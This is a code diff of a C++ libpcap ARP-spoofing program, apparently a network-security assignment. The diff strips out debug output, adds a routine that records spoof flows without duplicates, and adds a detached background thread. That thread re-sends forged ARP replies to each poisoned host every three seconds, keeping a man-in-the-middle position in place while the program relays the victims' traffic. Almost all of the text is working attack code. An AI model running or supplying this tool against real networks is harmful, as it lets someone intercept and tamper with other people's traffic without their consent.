@@ -10,6 +10,9 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <iomanip>
+#include <thread>
+#include <chrono>
+
 
 /* GO */
 #include "ethhdr.h"
@@ -150,14 +153,6 @@ bool get_me_mac(const std::string& interface, uint8_t mac[6])
 
 /* Go : get end */
 
-
-
-
-
-
-
-
-
 /* Go: Check Packet */
 
 uint32_t c_to_u32_ip(const char* t_ip)
@@ -189,7 +184,6 @@ uint32_t c_to_u32_ip(const char* t_ip)
 //1. first reply (for sender mac)
 bool isSreply(const u_char* packet, Ip s_ip, Ip m_ip, Mac me_mac )
 {
-
     const u_char *cpacket = packet;
 
     EthHdr *ethHdr = (EthHdr*) cpacket;
@@ -197,19 +191,14 @@ bool isSreply(const u_char* packet, Ip s_ip, Ip m_ip, Mac me_mac )
     ArpHdr *arpHdr = (ArpHdr*) cpacket;
 
     //1. is Arp?
-
     if(ethHdr->type()!= ethHdr->Arp) return false; // GO: not Arp(0x0806)
 
     //2. is s_ip == cs_ip ?
-    //printf("cs_ip : %u\n",arpHdr->sip()); // debug
-    //printf("s_ip : %u\n", ntohl(s_ip)); // debug
     Ip cs_ip = arpHdr->sip();
 
     if(cs_ip!= ntohl(s_ip)) return false;
 
     //3. is m_ip == cm_ip ?
-    //printf("cm_ip : %u\n",arpHdr->tip()); // debug
-    //printf("m_ip : %u\n", m_ip); // debug
     Ip cm_ip = arpHdr->tip();
     if(cm_ip!= ntohl(m_ip)) return false;
 
@@ -217,7 +206,6 @@ bool isSreply(const u_char* packet, Ip s_ip, Ip m_ip, Mac me_mac )
     Mac cme_mac = arpHdr->tmac();
     if(cme_mac!=me_mac) return false;
 
-    printf("is Sreply\n"); // debug
     return true;
 }
 
@@ -232,34 +220,22 @@ bool isSpoofed(const u_char* packet, Ip s_ip, Ip t_ip, Mac s_mac ,Mac m_mac)
 
     //1. is IP?
     if(ethHdr->type()!= ethHdr->Ip4) return false; // GO: not IP
-    //printf("is IP\n");
 
     //2. is s_ip == cs_ip ?
     Ip cs_ip = ipHdr->sip();
-
-    //printf("cs_ip : %u\n",cs_ip); // debug
-    //printf("s_ip : %u\n", ntohl(s_ip)); // debug
     if(cs_ip!= ntohl(s_ip)) return false;
-    //printf("same1\n");
 
     //3. is t_ip == ct_ip ?
     Ip ct_ip = ipHdr->dip();
-
-    //printf("ct_ip : %u\n",ct_ip); // debug
-    //printf("t_ip : %u\n", ntohl(t_ip)); // debug
     if(ct_ip!= ntohl(t_ip)) return false;
-    printf("same2\n");
 
     //5. is me_mac == ct_mac ?
     Mac ct_mac = ethHdr->dmac();
     if(ct_mac!=m_mac) return false;
-    //printf("same mac me\n");
 
     //4. is s_mac == cs_mac ?
     Mac cs_mac = ethHdr->smac();
     if(cs_mac!=s_mac) return false;
-
-    printf("is Spoofed\n");
 
     return true;
 }
@@ -274,19 +250,13 @@ bool isArp_and_Rq(const u_char* packet)
     cpacket += sizeof(EthHdr);
     ArpHdr *arpHdr = (ArpHdr*) cpacket;
 
-    //printf("isArp_and_Rq called\n"); //debug
-
     //1. is Arp?
 
     if(ethHdr->type()!= ethHdr->Arp) return false; // GO: not Arp(0x0806)
 
-    //printf("isArp\n"); //debug
-
     //2. is s_ip == cs_ip ?
     uint16_t c_op = arpHdr->op();
     if(c_op!= arpHdr->Request) return false;
-
-    printf("recover case1\n"); //debug
 
     return true;
 }
@@ -301,12 +271,8 @@ bool isRecoverCase(const u_char* packet, Ip s_ip)
     ArpHdr *arpHdr = (ArpHdr*) cpacket;
 
     Ip cs_ip = arpHdr->sip();
-
-    //printf("cs_ip : %u\n",cs_ip); // debug
-    //printf("s_ip : %u\n", ntohl(s_ip)); // debug
     if(cs_ip!= ntohl(s_ip)) return false;
 
-    printf("recover case2\n"); //debug
     return true;
 
 }
@@ -378,22 +344,25 @@ u_char* m_relay_packet(const u_char* packet, Mac me_mac, Mac t_mac, uint32_t& ou
     eth_hdr->dmac_ = t_mac;
     eth_hdr->smac_ = me_mac;
 
-    //debug
-    Mac ssmac = eth_hdr->smac();
-    Mac ddmac = eth_hdr->dmac();
-
-    const uint8_t* smac_ptr = reinterpret_cast<const uint8_t*>(&ssmac);
-    const uint8_t* dmac_ptr = reinterpret_cast<const uint8_t*>(&ddmac);
-
-    printf("[Relay MAC] Src = %02X:%02X:%02X:%02X:%02X:%02X, Dst = %02X:%02X:%02X:%02X:%02X:%02X\n",
-           smac_ptr[0], smac_ptr[1], smac_ptr[2], smac_ptr[3], smac_ptr[4], smac_ptr[5],
-           dmac_ptr[0], dmac_ptr[1], dmac_ptr[2], dmac_ptr[3], dmac_ptr[4], dmac_ptr[5]);
-
     return relay_packet;
 }
 
 
 /* Go: Make Packet End */
+
+
+void add_spoof_flow(std::vector<ArpSpoofFlow>& flows, Ip s_ip, Ip t_ip, Mac s_mac, Mac t_mac, bool relay, Mac real_t_mac)
+{
+    // 1. check is it duplicate
+    for (int i = 0; i < flows.size(); i++) {
+        if (flows[i].s_ip == s_ip && flows[i].t_ip == t_ip) {
+            return;
+        }
+    }
+
+    // 2. add
+    flows.push_back({s_ip, t_ip, s_mac, t_mac, relay, real_t_mac});
+}
 
 int main(int argc, char* argv[]) {
 
@@ -402,7 +371,7 @@ int main(int argc, char* argv[]) {
 		return EXIT_FAILURE;
 	}
 
-    /* GO : 1. infect senders */
+    /* GO : infect */
     int repeat_time = argc/2 - 1;
     char* dev = argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -415,7 +384,6 @@ int main(int argc, char* argv[]) {
     Mac me_mac = Mac(me_mac_ar);
 
     vector<ArpSpoofFlow> spoof_flows;
-
 
     for(int re=0; re<repeat_time; re++){
 
@@ -452,15 +420,8 @@ int main(int argc, char* argv[]) {
             //3. is_Sreply
             if(!isSreply(packet, s_ip, me_ip, me_mac))continue;
 
-            //4-1. get Smac (sender mac)
+            //4. get Smac (sender mac)
             s_mac = get_s_mac(packet);
-
-            //4-2. get Tmac (target mac)
-            /*Mac t_mac = get_t_mac(packet);
-            const uint8_t* tmac_ptr = reinterpret_cast<const uint8_t*>(&t_mac);
-            printf("[First t_mac] = %02X:%02X:%02X:%02X:%02X:%02X\n",
-                   tmac_ptr[0], tmac_ptr[1], tmac_ptr[2], tmac_ptr[3], tmac_ptr[4], tmac_ptr[5]);*/
-           //debug
 
             //5. make sender attack packet
             Ip t_ip = Ip(c_to_u32_ip(argv[re*2+3]));
@@ -471,34 +432,20 @@ int main(int argc, char* argv[]) {
 
             EthArpPacket attack_packet = m_a_packet(me_mac, ttt_ip, s_mac, s_ip); //sender
 
-            //EthArpPacket attack_packet_target = m_a_packet(me_mac, s_ip, t_mac, ttt_ip); //TODO : maybe under gogo
 
-            //6-1. send the attack_packet (sender)
+            //6. send the attack_packet (sender)
             int res2 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&attack_packet), sizeof(EthArpPacket));
             if (res2 != 0) {
                 fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(pcap));
             }
 
-            //6-2. send the attack_packet (target) //TODO : maybe under gogo
-            // target thinks sender's mac is me
-            //int res3 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&attack_packet_target), sizeof(EthArpPacket));
-            //if (res3 != 0) {
-            //    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res3, pcap_geterr(pcap));
-            //}
-
-            //spoof_flows.push_back({s_ip, ttt_ip, s_mac, me_mac, true, t_mac});
-            //spoof_flows.push_back({ttt_ip, s_ip, t_mac, me_mac, true, s_mac}); //TODO : maybe under gogo
-
-            //pcap_close(pcap);
             break;
         }
 
 
         //2-2. make request packet (for target mac)
 
-        /*-----------------------------------------------*/
-
-        Ip t_ip = Ip(htonl(c_to_u32_ip(argv[re*2+3]))); // GO : check it's ok to make packet, but wrong to isSreply
+        Ip t_ip = Ip(htonl(c_to_u32_ip(argv[re*2+3])));
 
         EthArpPacket r_packet_t = m_rq_packet(me_mac, me_ip, t_ip);
         //send the request_packet
@@ -520,15 +467,8 @@ int main(int argc, char* argv[]) {
             //3. is_Sreply
             if(!isSreply(packet, t_ip, me_ip, me_mac))continue;
 
-            //4-1.
+            //4.
             Mac t_mac = get_s_mac(packet);
-
-            /*debug */
-            const uint8_t* tmac_ptr = reinterpret_cast<const uint8_t*>(&t_mac);
-            printf("[First t_mac] = %02X:%02X:%02X:%02X:%02X:%02X\n",
-                   tmac_ptr[0], tmac_ptr[1], tmac_ptr[2], tmac_ptr[3], tmac_ptr[4], tmac_ptr[5]);
-            /*debug*/
-
 
             //5. make target attack packet
             EthArpPacket attack_packet_target = m_a_packet(me_mac, s_ip, t_mac, t_ip); //sender
@@ -541,8 +481,8 @@ int main(int argc, char* argv[]) {
                 fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res3, pcap_geterr(pcap));
             }
 
-            spoof_flows.push_back({s_ip, t_ip, s_mac, me_mac, true, t_mac});
-            spoof_flows.push_back({t_ip, s_ip, t_mac, me_mac, true, s_mac});
+            add_spoof_flow(spoof_flows, s_ip, t_ip, s_mac, me_mac, true, t_mac);
+            add_spoof_flow(spoof_flows, t_ip, s_ip, t_mac, me_mac, true, s_mac);
 
             //pcap_close(pcap);
             break;
@@ -550,9 +490,23 @@ int main(int argc, char* argv[]) {
     }
 
 
-    /*-----------------------------------------------*/
+    /* GO : infect end */
 
-    /* GO : 1. infect senders end */
+
+
+    /* GO : periodically attack */
+
+    std::thread reinfect_thread([&]() { //capture method : here var gogo
+        while (true) {
+            for (int i = 0; i < spoof_flows.size(); i++) {
+                EthArpPacket pkt = m_a_packet(me_mac, spoof_flows[i].t_ip, spoof_flows[i].s_mac, spoof_flows[i].s_ip);
+                pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&pkt), sizeof(EthArpPacket));
+            }
+            std::this_thread::sleep_for(std::chrono::seconds(3));
+        }
+    });
+    reinfect_thread.detach(); //gogo background!!
+    /* GO : periodically attack end */
 
 
     //TODO : send relay packet
@@ -597,15 +551,12 @@ int main(int argc, char* argv[]) {
             if (res5 != 0) {
                 fprintf(stderr, "reattack send error=%s\n", pcap_geterr(pcap));
             }
-            printf("re infect packet send\n"); //debug
 
         }
 
 
+
+
     }
-
-
-
-
 
 }
